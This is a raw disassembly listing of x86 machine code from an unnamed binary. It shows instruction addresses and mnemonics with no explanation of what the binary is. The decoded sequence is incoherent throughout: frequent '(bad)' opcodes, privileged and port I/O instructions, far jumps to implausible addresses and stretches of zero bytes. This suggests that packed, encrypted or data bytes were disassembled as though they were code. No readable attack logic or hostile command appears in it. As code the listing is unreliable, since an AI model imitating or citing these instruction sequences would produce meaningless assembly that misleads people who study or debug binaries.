  416fc2:	cs pop edi
  416fc4:	mov    al,0x27
  416fc6:	or     DWORD PTR [ecx-0x40],esi
  416fc9:	pop    esp
  416fca:	cmp    esi,DWORD PTR [ebp-0x53]
  416fcd:	dec    ebp
  416fce:	cmp    al,0x0
  416fd0:	pop    esp
  416fd1:	mov    edi,esp
  416fd3:	das    
  416fd4:	pop    esp
  416fd5:	mov    ecx,DWORD PTR [eax+esi*2]
  416fd8:	mov    eax,ds:0xa96c38ed
  416fdd:	cmp    esp,DWORD PTR [ebx]
  416fdf:	ins    DWORD PTR es:[edi],dx
  416fe0:	jle    0x417039
  416fe2:	sub    ch,BYTE PTR [esi-0x74]
  416fe5:	push   ecx
  416fe6:	sub    ah,BYTE PTR [edi-0x80]
  416fe9:	xchg   esp,eax
  416fea:	xchg   edi,eax
  416feb:	add    edi,DWORD PTR [ebp-0x61]
  416fee:	test   BYTE PTR [esi],ch
  416ff0:	outs   dx,DWORD PTR ds:[esi]
  416ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ff2:	fbld   TBYTE PTR [edx]
  416ff4:	pop    ebp
  416ff5:	mov    esp,0x94632673
  416ffa:	xor    DWORD PTR [esi],0x358ca05d
  417000:	mov    WORD PTR [esp+eax*4+0x75af3a22],?
  417007:	add    edi,DWORD PTR [edi+ebp*4]
  41700a:	dec    edi
  41700b:	xor    al,0x2f
  41700d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41700e:	(bad)  
  417010:	pusha  
  417011:	popa   
  417012:	push   ss
  417013:	stc    
  417014:	pop    eax
  417015:	popa   
  417016:	fild   QWORD PTR [ebx]
  417018:	pop    ds
  417019:	mov    edx,0x941e2733
  41701e:	inc    ebx
  41701f:	xor    DWORD PTR [eax],eax
	...
  417031:	add    BYTE PTR [eax],al
  417033:	add    BYTE PTR [edx],al
  417035:	mov    dl,0x4b
  417037:	cmp    ecx,DWORD PTR [ebp+esi*4-0x4e01d7cb]
  41703e:	push   ss
  41703f:	add    al,0xf8
  417041:	mov    esp,0xa3cb2f06
  417046:	fbld   TBYTE PTR [edx]
  417048:	repnz scas eax,DWORD PTR es:[edi]
  41704a:	or     al,0x30
  41704c:	fst    QWORD PTR [edx+eax*1+0x3a2b32c]
  417053:	sub    ebp,DWORD PTR [edi-0x4ddcfc6c]
  417059:	mov    ebp,0x658c300c
  41705e:	adc    bl,dh
  417060:	bound  edx,QWORD PTR [ecx+ebx*8-0x374945da]
  417067:	sub    DWORD PTR [edi-0x4ccb205e],ebp
  41706d:	mov    dh,0xc6
  41706f:	das    
  417070:	scas   eax,DWORD PTR es:[edi]
  417071:	xchg   esp,eax
  417072:	xlat   BYTE PTR ds:[ebx]
  417073:	and    bh,BYTE PTR [edx-0x4a]
  417076:	or     al,cl
  417078:	mov    bh,0x94
  41707a:	ja     0x417044
  41707c:	mov    ecx,0x8fa179a1
  417081:	mov    esp,0x9f9f9967
  417086:	or     BYTE PTR [esi+ebp*4-0x687f8560],al
  41708d:	xchg   esp,eax
  41708e:	js     0x417018
  417090:	cwde   
  417091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417092:	or     BYTE PTR [eax-0x77983892],cl
	...
  4170ac:	outs   dx,BYTE PTR ds:[esi]
  4170ad:	xchg   esp,eax
  4170ae:	ds mov ah,0xc3
  4170b1:	cmp    bl,BYTE PTR fs:[eax]
  4170b4:	mov    bh,al
  4170b6:	arpl   WORD PTR [eax+0x7a],cx
  4170b9:	mov    al,0x67
  4170bb:	jmp    0x41be2a31
  4170c0:	imul   esi,DWORD PTR [esi-0x50951693],0xa2b54666
  4170ca:	or     BYTE PTR [ebx+esi*4-0x60],al
  4170ce:	pusha  
  4170cf:	inc    esp
  4170d0:	mov    esi,0xa3177994
  4170d5:	mov    ecx,0xba902078
  4170da:	imul   ebx,DWORD PTR [edx],0xffffff9f
  4170dd:	scas   eax,DWORD PTR es:[edi]
  4170de:	imul   ecx,DWORD PTR [eax],0x156ba190
  4170e4:	scas   eax,DWORD PTR es:[edi]
  4170e5:	mov    ecx,0xa4900463
  4170ea:	add    dh,BYTE PTR gs:[ebp-0x45]
  4170ee:	dec    DWORD PTR gs:[edi+0x79d664af]
  4170f5:	mov    bl,0x6f
  4170f7:	into   
  4170f8:	fs ja  0x417103
  4170fb:	sbb    BYTE PTR [ecx],bl
  4170fd:	jbe    0x417136
  4170ff:	sbb    BYTE PTR [eax-0x29ff8445],dl
  417105:	pop    esi
  417106:	push   ebp
  417107:	outs   dx,BYTE PTR ds:[esi]
  417108:	rcl    BYTE PTR [edx+0x62c96560],cl
  41710e:	popa   
  41710f:	add    BYTE PTR gs:[eax],al
	...
  417122:	add    BYTE PTR [eax],al
  417124:	in     eax,0x7c
  417126:	jns    0x41719b
  417128:	adc    DWORD PTR [eax+0x66],edi
  41712b:	add    bh,bh
  41712d:	outs   dx,DWORD PTR ds:[esi]
  41712e:	ja     0x41719d
  417130:	or     al,0x79
  417132:	imul   eax,DWORD PTR [eax],0x6e55655a
  417138:	add    bh,BYTE PTR [eax+ecx*1+0x74]
  41713c:	adc    BYTE PTR [edx+0x7c],ah
  41713f:	imul   ecx,DWORD PTR [ebx],0x3561086e
  417145:	arpl   WORD PTR [ebp+eiz*2-0x5b],sp
  417149:	arpl   WORD PTR [ebp+0x63],bp
  41714c:	cmp    eax,0x506c647d
  417151:	nop
  417152:	js     0x4171b9
  417154:	inc    esp
  417155:	jae    0x4171c0
  417157:	add    BYTE PTR [esi+0x7d],dl
  41715a:	addr16 jb 0x41712d
  41715d:	ins    BYTE PTR es:[edi],dx
  41715e:	or     BYTE PTR [ecx],dh
  417160:	jne    0x4171d1
  417162:	jp     0x4171c5
  417164:	(bad)  
  417165:	jnp    0x41716f
  417167:	ja     0x417105
  417169:	fs imul edx,DWORD PTR fs:[ebx+eiz*2+0x75896908],0x757c657e
  417176:	jns    0x4171aa
  417178:	gs js  0x4171e8
  41717b:	arpl   WORD PTR [edx+0x3006964],bx
  417181:	and    BYTE PTR [ebx],bh
  417183:	add    esp,DWORD PTR ss:[eax]
  417186:	cmc    
  417187:	ins    BYTE PTR es:[edi],dx
	...
  41719c:	push   eax
  41719d:	jo     0x41720d
  41719f:	imul   ebx,DWORD PTR [ebx-0x6e],0x478c616b
  4171a6:	and    BYTE PTR [ebp-0x53],dh
  4171a9:	inc    esp
  4171aa:	or     DWORD PTR [esi-0x67],esp
  4171ad:	pop    edx
  4171ae:	and    dh,BYTE PTR [edi+0x7b]
  4171b1:	loopne 0x4171ae
  4171b3:	jmp    FWORD PTR [edx+ebp*8+0x39]
  4171b7:	push   0x1fe76b
  4171bc:	fs sbb al,0x21
  4171bf:	pop    edi
  4171c0:	je     0x4171de
  4171c2:	or     DWORD PTR [eax+0x73],esi
  4171c5:	push   cs
  4171c6:	cmp    DWORD PTR [eax],eax
  4171c8:	outs   dx,BYTE PTR ds:[esi]
  4171c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171ca:	and    BYTE PTR [ecx+0x5f],dh
  4171cd:	add    al,0x23
  4171cf:	mov    WORD PTR gs:[ecx],ds
  4171d2:	and    eax,0x2519345f
  4171d7:	pop    edi
  4171d8:	and    al,0x3b
  4171da:	cmp    BYTE PTR [edi+0x3f],dh
  4171dd:	retf   
  4171de:	sub    DWORD PTR [ecx+0x31],esp
  4171e1:	mov    WORD PTR [ebx+ebp*2],cs
  4171e4:	sub    eax,0x316830c7
  4171e9:	mov    esi,0xbd2d610c
  4171ee:	sub    DWORD PTR [ebp+ebp*8+0x3b],esp
  4171f2:	cmp    BYTE PTR [edi-0x10],ah
  4171f5:	gs sub eax,0x23698c72
  4171fb:	(bad)  
  4171fc:	jmp    0x41a28a
	...
  417211:	add    BYTE PTR [eax],al
  417213:	add    dl,dh
  417215:	xchg   esi,eax
  417216:	cmp    ah,BYTE PTR [ebx-0x26]
  417219:	cwde   
  41721a:	cmp    al,BYTE PTR [eax]
  41721c:	in     eax,dx
  41721d:	mov    ah,BYTE PTR [eax]
  41721f:	data16 jmp 0x4171a5
  417222:	or     al,0x72
  417224:	lods   eax,DWORD PTR ds:[esi]
  417225:	call   0x5f37:0x3bb06324
  41722c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41722d:	and    eax,0x94bb6d27
  417232:	fbld   TBYTE PTR [edi+ebx*4]
  417235:	mov    ebx,0x949e22db
  41723a:	iret   
  41723b:	es mov ebx,0x8c37dcb6
  417241:	mov    dl,0xc0
  417243:	aaa    
  417244:	ja     0x4171f9
  417246:	lds    eax,FWORD PTR [ebx]
  417248:	ins    DWORD PTR es:[edi],dx
  417249:	mov    ch,0xce
  41724b:	sub    BYTE PTR [ebx-0x51],dh
  41724e:	fbld   TBYTE PTR [ecx]
  417250:	push   ebx
  417251:	mov    ebx,0x9463269b
  417256:	xchg   edx,eax
  417257:	sub    al,0x6d
  417259:	mov    cl,0x84
  41725b:	xor    DWORD PTR [ebx+0x6d2a7494],ebp
  417261:	mov    ecx,0xb28c3a84
  417266:	cwde   
  417267:	aaa    
  417268:	das    
  417269:	mov    bh,0x84
  41726b:	add    esp,DWORD PTR [edi+ebp*4]
  41726e:	jae    0x41729f
  417270:	and    DWORD PTR [ebx-0x21],esp
  417273:	es aaa 
  417275:	mov    ebx,0x2745
	...
  41728a:	add    BYTE PTR [eax],al
  41728c:	aaa    
  41728d:	xchg   esp,eax
  41728e:	inc    ebx
  41728f:	and    esp,DWORD PTR ds:0x8c235bb5
  417295:	mov    eax,ds:0xb2eb2f40
  41729a:	cmp    ebp,DWORD PTR [ebx+eiz*8]
  41729d:	xchg   esp,eax
  41729e:	inc    edx
  41729f:	sub    eax,0x3340a4e7
  4172a4:	mov    WORD PTR [eax-0x4c08dce8],?
  4172aa:	add    eax,0xa88c28
  4172af:	cmp    ebp,eax
  4172b1:	mov    bl,0x11
  4172b3:	add    al,0xea
  4172b5:	mov    bl,0xf1
  4172b7:	ss mov bh,0x94
  4172ba:	sbb    DWORD PTR ds:0xba08b2b4,ebp
  4172c0:	ds push 0x8
  4172c3:	sti    
  4172c4:	data16 mov ch,0x60
  4172c7:	enter  0xb85d,0x8
  4172cb:	retf   
  4172cc:	jae    0x417289
  4172ce:	retw   0x6c1e
  4172d2:	cmp    ch,cl
  4172d4:	pop    edi
  4172d5:	mov    bh,0x67
  4172d7:	retf   0xb7b7
  4172da:	jns    0x4172c5
  4172dc:	lods   al,BYTE PTR ds:[esi]
  4172dd:	mov    cl,0x65
  4172df:	lds    ecx,FWORD PTR [edi-0x47419b46]
  4172e5:	mov    bh,0x7a
  4172e7:	jmp    0x8ea72888
  4172ec:	fwait
  4172ed:	mov    bh,0x7a
  4172ef:	jmp    0x4172f4
	...
  417304:	lods   eax,DWORD PTR ds:[esi]
  417305:	ret    
  417306:	data16 mov BYTE PTR [ecx+0x6e9308c3],ah
  41730d:	scas   eax,DWORD PTR es:[edi]
  41730e:	imul   edi,DWORD PTR [edx-0x71],0xffffffc3
  417312:	jns    0x4172a1
  417314:	jno    0x4172d9
  417316:	jns    0x41729d
  417318:	imul   edx,DWORD PTR [esi+edi*2+0x65a87350],0x6494615b
  417323:	inc    esi
  417324:	mov    ax,0x3f65
  417328:	mov    BYTE PTR [ebx+0x3a],dh
  41732b:	cli    
  41732c:	shr    BYTE PTR [ecx+0x6578e96b],0x39
  417333:	cli    
  417334:	xor    DWORD PTR [edx+0x8],0x7ac3bc3a
  41733b:	sbb    eax,0xe961b7a2
  417340:	scas   al,BYTE PTR es:[edi]
  417341:	mov    bh,0x65
  417343:	sbb    ebp,DWORD PTR [edi-0x5ee9f749]
  417349:	mov    dl,0x66
  41734b:	add    BYTE PTR [eax-0x6b92f796],bl
  417351:	ja     0x4173be
  417353:	imul   ecx,DWORD PTR [eax-0x738d8368],0x2c746d6e
  41735d:	xchg   edi,eax
  41735e:	arpl   WORD PTR [esi+0x51],bp
  417361:	jo     0x4173c9
  417363:	gs and eax,0x333728
	...
  417379:	add    BYTE PTR [eax],al
  41737b:	add    BYTE PTR [ecx+edi*2+0x67],al
  41737f:	add    dh,dl
  417381:	outs   dx,BYTE PTR ds:[esi]
  417382:	ins    DWORD PTR es:[edi],dx
  417383:	arpl   si,bx
  417385:	jae    0x4173ed
  417387:	add    bh,cl
  417389:	arpl   WORD PTR [esi+0x69],sp
  41738c:	xor    ch,BYTE PTR [ecx+0x8]
  41738f:	arpl   bp,di
  417391:	push   0x66f5736d
  417396:	push   ebp
  417397:	jae    0x41738f
  417399:	cmp    BYTE PTR gs:[edx+0x9],dh
  41739d:	xchg   edi,eax
  41739e:	push   ebp
  41739f:	jne    0x4173e7
  4173a1:	jae    0x417410
  4173a3:	outs   dx,BYTE PTR ds:[esi]
  4173a4:	mov    ch,0x69
  4173a6:	js     0x417409
  4173a8:	aaa    
  4173a9:	jb     0x417428
  4173ab:	add    BYTE PTR [ebx+eax*4],al
  4173ae:	popa   
  4173af:	imul   eax,DWORD PTR [ebx-0x68],0x6c476561
  4173b6:	ins    DWORD PTR es:[edi],dx
  4173b7:	outs   dx,BYTE PTR ds:[esi]
  4173b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173b9:	jne    0x41741e
  4173bb:	outs   dx,DWORD PTR ds:[esi]
  4173bc:	dec    edx
  4173bd:	ins    BYTE PTR es:[edi],dx
  4173be:	imul   eax,DWORD PTR [eax],0x656d6adb
  4173c4:	shl    DWORD PTR [edi+esi*2+0x0],cl
  4173c8:	int    0x6d
  4173ca:	js     0x417431
  4173cc:	imul   esp,DWORD PTR gs:[eax+0x61],0xffffff81
  4173d1:	ins    DWORD PTR es:[edi],dx
  4173d2:	popa   
  4173d3:	add    BYTE PTR [ebx-0x738b9991],dl
  4173d9:	nop
  4173da:	and    ah,BYTE PTR [ebx+eiz*8+0x2b]
  4173de:	sub    eax,0x6d
	...
  4173f3:	add    BYTE PTR [ebx-0x5491dc7a],bh
  4173f9:	sub    esp,DWORD PTR [ecx]
  4173fb:	pop    edi
  4173fc:	mov    esi,0x8c772797
  417401:	push   ds
  417402:	and    BYTE PTR [ebp-0x49],ch
  417405:	push   eax
  417406:	xor    al,0x0
  417408:	pop    ebx
  417409:	mov    bh,cl
  41740b:	xor    al,0x8c
  41740d:	push   ebp
  41740e:	and    dh,BYTE PTR [ecx-0x57]
  417411:	cmp    esp,DWORD PTR [ecx]
  417413:	add    BYTE PTR [eax-0x20],bh
  417416:	sub    eax,0x152b8569
  41741b:	addr16 jae 0x417472
  41741e:	and    eax,0x2c2b605f
  417423:	add    BYTE PTR [eax+0x3],ah
  417426:	cmp    BYTE PTR [esi+0x68],ch
  417429:	sbb    BYTE PTR [ebx],bh
  41742b:	add    BYTE PTR [edi-0x5],bl
  41742e:	and    esi,DWORD PTR [edx+0x65]
  417431:	pop    es
  417432:	or     DWORD PTR [edx+0x2d],esp
  417435:	or     DWORD PTR ds:0x282b3867,edx
  41743b:	outs   dx,BYTE PTR ds:[esi]
  41743c:	inc    eax
  41743d:	adc    BYTE PTR [ebx],bh
  41743f:	add    BYTE PTR ds:0x3b6825a1,ch
  417445:	leave  
  417446:	xor    DWORD PTR [eax],eax
  417448:	das    
  417449:	sar    BYTE PTR [esi],cl
  41744b:	jbe    0x41747e
  41744d:	mov    edi,0xd38c6338
  417452:	pop    ds
  417453:	popa   
  417454:	not    eax
  417456:	xor    DWORD PTR [eax],eax
	...
  41746c:	cld    
  41746d:	shl    BYTE PTR [edi],cl
  41746f:	arpl   si,di
  417471:	sub    ebp,DWORD PTR [ebx]
  417473:	arpl   dx,sp
  417475:	aad    0x29
  417477:	imul   esi,ebp,0xffffff94
  41747a:	sbb    eax,0x6b0eb04
  41747f:	xor    ch,bh
  417481:	fwait
  417482:	push   cs
  417483:	das    
  417484:	jae    0x41741a
  417486:	shl    BYTE PTR [edx],1
  417488:	jle    0x417433
  41748a:	mov    dl,0x1e
  41748c:	mov    WORD PTR [edx-0x5950cbe8],gs
  417492:	fbld   TBYTE PTR [eax]
  417494:	scas   eax,DWORD PTR es:[edi]
  417495:	mov    dl,0xc
  417497:	xor    eax,0x2cdfa5b3
  41749c:	mov    dl,0xab
  41749e:	into   
  41749f:	sub    esp,DWORD PTR [eax-0x50cf2f6c]
  4174a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174a6:	fstp   TBYTE PTR [edx]
  4174a8:	mov    ebx,0x6f35c294
  4174ad:	mov    bl,0xbb
  4174af:	sub    al,BYTE PTR [edx+0x6121dfb7]
  4174b5:	mov    cl,0xc1
  4174b7:	and    bl,BYTE PTR [esi-0x6c]
  4174ba:	sbb    BYTE PTR [edi],0x6b
  4174bd:	mov    eax,0xa68c3480
  4174c2:	mov    gs,WORD PTR [edi]
  4174c4:	imul   ebp,DWORD PTR [edi-0x4fc2fc78],0xffffff80
  4174cb:	cmp    ch,BYTE PTR [edi]
  4174cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ce:	fbstp  TBYTE PTR [eax]
	...
  4174e4:	xor    esp,DWORD PTR [ebp-0x6bd8d77d]
  4174ea:	outs   dx,DWORD PTR ds:[esi]
  4174eb:	xor    eax,0x1f52ab4b
  4174f0:	mov    WORD PTR [esi-0x49ddda99],ds
  4174f6:	dec    ebp
  4174f7:	daa    
  4174f8:	mov    WORD PTR [ebp-0x4600d8c0],fs
  4174fe:	pop    ebx
  4174ff:	add    al,0xf7
  417501:	lods   eax,DWORD PTR ds:[esi]
  417502:	pop    edx
  417503:	pop    ds
  417504:	mov    WORD PTR [eax-0x4f5bb7f8],?
  41750a:	cmp    dl,BYTE PTR [bx+si+0x7ab9]
  41750f:	or     al,0x83
  417511:	scas   al,BYTE PTR es:[edi]
  417512:	or     BYTE PTR ds:0x1d7ca57b,dl
  417518:	jae    0x4174bf
  41751a:	jl     0x417505
  41751c:	jb     0x4174dd
  41751e:	jle    0x41752c
  417520:	jp     0x4174d9
  417522:	imul   edx,DWORD PTR [edx],0xc66b190
  417528:	fs mov cl,0x7e
  41752b:	add    al,0x90
  41752d:	mov    eax,0xb876df67
  417532:	or     ah,cl
  417534:	push   esi
  417535:	mov    al,0x65
  417537:	fbstp  TBYTE PTR [edx-0x6c]
  41753a:	imul   eax,ecx,0xd169a2ba
  417540:	(bad)  
  417541:	mov    dh,0x7a
  417543:	rcr    BYTE PTR [edx+0xe96cae],1
	...
  417559:	add    BYTE PTR [eax],al
  41755b:	add    BYTE PTR [ecx+esi*4-0x4c741694],ch
  417562:	jns    0x417501
  417564:	mov    dh,0xae
  417566:	outs   dx,DWORD PTR ds:[esi]
  417567:	jmp    0x8ca82711
  41756c:	(bad)  
  41756d:	stos   DWORD PTR es:[edi],eax
  41756e:	pop    edi
  41756f:	mov    al,BYTE PTR [ecx+0x6d9679b1]
  417575:	test   al,0x8
  417577:	mov    ebx,0xbb3a65c1
  41757c:	mov    ecx,0x7174671f
  417581:	mov    dl,0x64
  417583:	dec    esp
  417584:	pop    edi
  417585:	xchg   esp,eax
  417586:	aaa    
  417587:	sbb    BYTE PTR [ecx-0x66e7c892],ah
  41758d:	outs   dx,BYTE PTR ds:[esi]
  41758e:	or     BYTE PTR [edx-0x4d],cl
  417591:	mov    ch,0x67
  417593:	add    dh,dl
  417595:	ja     0x4175fb
  417597:	popa   
  417598:	gs ins DWORD PTR es:[edi],dx
  41759a:	arpl   WORD PTR [edx-0x3f],si
  41759d:	jns    0x417605
  41759f:	xor    ah,BYTE PTR [esi-0x6d]
  4175a2:	ins    DWORD PTR es:[edi],dx
  4175a3:	ins    BYTE PTR es:[edi],dx
  4175a4:	jp     0x417614
  4175a6:	imul   esp,DWORD PTR [edi-0x76],0x8a660874
  4175ad:	ja     0x41762b
  4175af:	bound  edx,QWORD PTR [esp+ebp*2+0x77353164]
  4175b6:	arpl   WORD PTR [esi-0x64],si
  4175b9:	jbe    0x417626
  4175bb:	add    BYTE PTR [ebx+0x687c79],cl
	...
  4175d1:	add    BYTE PTR [eax],al
  4175d3:	add    BYTE PTR [esi+esi*2+0x6c386508],dl
  4175da:	push   ebp
  4175db:	outs   dx,BYTE PTR ds:[esi]
  4175dc:	inc    eax
  4175dd:	je     0x417643
  4175df:	add    BYTE PTR [esi],dh
  4175e1:	jb     0x417646
  4175e3:	outs   dx,DWORD PTR ds:[esi]
  4175e4:	xlat   BYTE PTR ds:[ebx]
  4175e5:	pop    edi
  4175e6:	or     BYTE PTR [esi+0x40],ah
  4175e9:	jb     0x41764a
  4175eb:	outs   dx,DWORD PTR ds:[esi]
  4175ec:	rol    DWORD PTR [eax+0x6bc47308],cl
  4175f2:	popa   
  4175f3:	jns    0x4175ea
  4175f5:	imul   edx,DWORD PTR [ebp+0x78],0x2
  4175f9:	je     0x41765f
  4175fb:	ins    BYTE PTR es:[edi],dx
  4175fc:	in     eax,0x6c
  4175fe:	push   ebp
  4175ff:	jae    0x41760b
  417601:	jns    0x41760b
  417603:	push   0x4a
  417605:	imul   esp,DWORD PTR [esi+0x0],0x4
  417609:	push   0x73f6773a
  41760e:	cmp    al,0x72
  417610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417611:	je     0x417668
  417613:	bound  ebx,QWORD PTR [ebx+edx*4]
  417616:	jp     0x41767d
  417618:	push   ecx
  417619:	sub    DWORD PTR [edi],esi
  41761b:	xor    esp,DWORD PTR [ebp-0x739e9b8c]
  417621:	retf   
  417622:	and    BYTE PTR [edi-0x74],bl
  417625:	mov    ebx,0xcaf2673a
  41762a:	daa    
  41762b:	add    ch,bh
  41762d:	data16 daa 
  41762f:	jb     0x417629
  417631:	sub    ebp,DWORD PTR [edx]
  417633:	push   0x63395ff1
	...
  41764c:	in     eax,dx
  41764d:	sub    edi,eax
  41764f:	xor    ah,BYTE PTR [ecx-0x130007b8]
  417655:	xchg   ebp,eax
  417656:	adc    eax,0x93cb863
  41765b:	push   0x611519ad
  417660:	stos   DWORD PTR es:[edi],eax
  417661:	sbb    DWORD PTR [eax],ebp
  417663:	add    BYTE PTR [eax-0x4e8bcb70],ch
  417669:	sbb    DWORD PTR [ecx],ecx
  41766b:	jno    0x41761a
  41766d:	cmp    eax,0x7c8c6428
  417672:	sti    
  417673:	xor    DWORD PTR [esi+0x7a],ebx
  417676:	stc    
  417677:	push   DWORD PTR [ebx+0x4c]
  41767a:	sub    eax,0x1f2b736c
  41767f:	pop    edi
  417680:	jg     0x41765d
  417682:	daa    
  417683:	jb     0x417611
  417685:	dec    edi
  417686:	sub    al,0x6e
  417688:	jne    0x4176e2
  41768a:	sub    eax,0x222b696c
  41768f:	addr16 pusha 
  417691:	pop    es
  417692:	sub    BYTE PTR [esi-0x74],ch
  417695:	or     ch,BYTE PTR [ecx+esi*2]
  417698:	aas    
  417699:	adc    al,0x28
  41769b:	add    BYTE PTR [edi],bh
  41769d:	lahf   
  41769e:	sub    BYTE PTR [eax+ebp*1+0xc],ch
  4176a2:	or     DWORD PTR [eax+0x3e],esi
  4176a5:	or     al,0x34
  4176a7:	arpl   WORD PTR [esi],bx
  4176a9:	sub    esp,DWORD PTR [ecx]
  4176ab:	ins    DWORD PTR es:[edi],dx
  4176ac:	sbb    BYTE PTR [ebx+eax*2+0x25],dl
	...
  4176c3:	add    BYTE PTR [ecx],dh
  4176c5:	xchg   esp,eax
  4176c6:	pop    esi
  4176c7:	sub    esp,DWORD PTR [edx]
  4176c9:	mov    eax,0x94fd2d4e
  4176ce:	xor    al,0x2f
  4176d0:	std    
  4176d1:	test   al,0x43
  4176d3:	sub    ebp,edi
  4176d5:	xchg   esp,eax
  4176d6:	dec    esi
  4176d7:	and    edi,eax
  4176d9:	mov    bh,0x32
  4176db:	add    al,0xee
  4176dd:	stos   DWORD PTR es:[edi],eax
  4176de:	xor    ebp,DWORD PTR [eax]
  4176e0:	jmp    0xdd608a98
  4176e5:	xchg   esp,eax
  4176e6:	push   cs
  4176e7:	sub    al,0xee
  4176e9:	mov    eax,0xb58c2613
  4176ee:	or     eax,0x1ca9b62c
  4176f3:	add    al,0x6b
  4176f5:	bound  esi,QWORD PTR [edx-0x49998111]
  4176fb:	sti    
  4176fc:	bound  esp,QWORD PTR [edi+ebx*8+0x3]
  417700:	scas   eax,DWORD PTR es:[edi]
  417701:	test   al,0xea
  417703:	xor    DWORD PTR [edx-0x5dce3957],esp
  417709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41770a:	aam    0x3
  41770c:	je     0x4176b6
  41770e:	(bad)  [ebx]
  417710:	(bad)  
  417711:	ins    DWORD PTR es:[edi],dx
  417712:	push   ds
  417713:	and    DWORD PTR [ebx-0x5c],ebx
  417716:	fsubr  DWORD PTR [edi]
  417718:	jg     0x4176ca
  41771a:	into   
  41771b:	xor    BYTE PTR [eax-0x49],dh
  41771e:	cmc    
  41771f:	and    BYTE PTR [ecx-0x51],dh
  417722:	jmp    0xcf9e2322
  417727:	in     al,0x0
	...
  417739:	add    BYTE PTR [eax],al
  41773b:	add    BYTE PTR [ecx-0x53],ch
  41773e:	xchg   ecx,eax
  41773f:	cs aaa 
  417741:	ins    DWORD PTR es:[edi],dx
  417742:	popf   
  417743:	sub    ch,BYTE PTR [edi]
  417745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417746:	jae    0x41776c
  417748:	cmp    al,0xab
  41774a:	and    ch,0x23
  41774d:	lods   al,BYTE PTR ds:[esi]
  41774e:	or     BYTE PTR [ecx-0x71],bh
  417751:	lods   al,BYTE PTR ds:[esi]
  417752:	jl     0x4177c9
  417754:	pop    edi
  417755:	pop    edx
  417756:	and    eax,0x30669f16
  41775b:	setg   BYTE PTR [eax+0x3c]
  41775f:	pop    es
  417760:	jge    0x4177c6
  417762:	sbb    BYTE PTR es:[eax+0x67],bh
  417766:	xor    al,BYTE PTR [ecx]
  417768:	and    BYTE PTR [eax+edi*1+0xe],0x92
  41776d:	test   eax,0x69b33c7a
  417772:	jle    0x4177b4
  417774:	and    DWORD PTR [ecx-0x4c5fe984],0x69
  41777b:	iret   
  41777c:	lahf   
  41777d:	lods   al,BYTE PTR ds:[esi]
  41777e:	js     0x417769
  417780:	(bad)  
  417781:	lods   al,BYTE PTR ds:[esi]
  417782:	jl     0x417799
  417784:	js     0x4177e4
  417786:	and    eax,0x63bb7cd6
  41778b:	iret   
  41778c:	nop
  41778d:	mov    bh,0x7a
  41778f:	push   cs
  417790:	jno    0x417737
  417792:	data16 add al,0x5c
  417795:	push   0x69
  417797:	(bad)  
  417798:	jb     0x417803
  41779a:	inc    eax
  41779b:	retf   0x62cb
  41779e:	es int3 
	...
  4177b4:	(bad)  
  4177b5:	mov    bh,0x8
  4177b7:	shl    DWORD PTR [ebx-0xefc8760],0x68
  4177be:	cmp    bh,cl
  4177c0:	imul   DWORD PTR [ecx+0x37]
  4177c3:	stc    
  4177c4:	out    0x69,al
  4177c6:	cmp    dh,ch
  4177c8:	fsubr  QWORD PTR [ecx+0x3a]
  4177cb:	fcom   st(7)
  4177cd:	push   0x6472936f
  4177d2:	mov    WORD PTR es:[edi+0x738108b7],es
  4177d9:	mov    al,ds:0x30cf0078
  4177de:	and    al,0x31
  4177e0:	int3   
  4177e1:	pop    ds
  4177e2:	and    esi,DWORD PTR [ecx]
  4177e4:	jmp    0x231f:0xe6322324
  4177eb:	xor    DWORD PTR [eax+0x37],edi
  4177ee:	outs   dx,DWORD PTR ds:[esi]
  4177ef:	js     0x41784b
  4177f1:	ss push 0x78
  4177f4:	fcom   DWORD PTR [eax+0x59b85908]
  4177fa:	pop    eax
  4177fb:	push   edi
  4177fc:	test   eax,0xa84c4dce
  417801:	and    BYTE PTR [esi+0x55],bl
  417804:	lods   al,BYTE PTR ds:[esi]
  417805:	sar    BYTE PTR [edi],0x44
  417808:	stos   DWORD PTR es:[edi],eax
  417809:	pop    ecx
  41780a:	inc    esp
  41780b:	inc    ebp
  41780c:	xor    eax,0xa64959c8
  417811:	ret    0x505d
  417814:	mov    ebp,ecx
  417816:	dec    esp
  417817:	xor    BYTE PTR [eax],al
	...
  417829:	add    BYTE PTR [eax],al
  41782b:	add    BYTE PTR [ebp+edi*4+0x4d],bh
  41782f:	xor    DWORD PTR [ebx+0x27],esp
  417832:	cmc    
  417833:	jmp    DWORD PTR ds:0x35020897
  417839:	aam    0x43
  41783b:	inc    esp
  41783c:	js     0x4177cf
  41783e:	cmc    
  41783f:	jmp    DWORD PTR ds:0x25000897
  417845:	xchg   edi,eax
  417846:	or     BYTE PTR [ebx+0x32],dl
  417849:	int    0x5c
  41784b:	push   edi
  41784c:	xor    al,0xc1
  41784e:	dec    ecx
  41784f:	pop    esp
  417850:	inc    eax
  417851:	js     0x4178ba
  417853:	jb     0x417817
  417855:	popa   
  417856:	arpl   WORD PTR [esi+0x29],sp
  417859:	retf   
  41785a:	pop    ebx
  41785b:	imul   esp,DWORD PTR [ebx],0xf6776373
  417861:	retf   0x7547
  417864:	mul    DWORD PTR [eax+0x69]
  417867:	outs   dx,BYTE PTR ds:[esi]
  417868:	mov    ecx,?
  41786a:	dec    esi
  41786b:	arpl   WORD PTR [esi],di
  41786d:	(bad)  
  41786e:	adc    ebp,DWORD PTR [ebp+0x2a]
  417871:	icebp  
  417872:	dec    edi
  417873:	outs   dx,BYTE PTR ds:[esi]
  417874:	and    eax,0x2d743e0b
  417879:	adc    DWORD PTR ds:0x149b3900,edx
  41787f:	outs   dx,BYTE PTR ds:[esi]
  417880:	pop    ds
  417881:	mov    ecx,0x5e206c2b
  417886:	xor    BYTE PTR [edx-0xb],dh
  417889:	shl    DWORD PTR [ecx],1
  41788b:	add    al,cl
  41788d:	aam    0x3d
  41788f:	jo     0x417891
	...
  4178a1:	add    BYTE PTR [eax],al
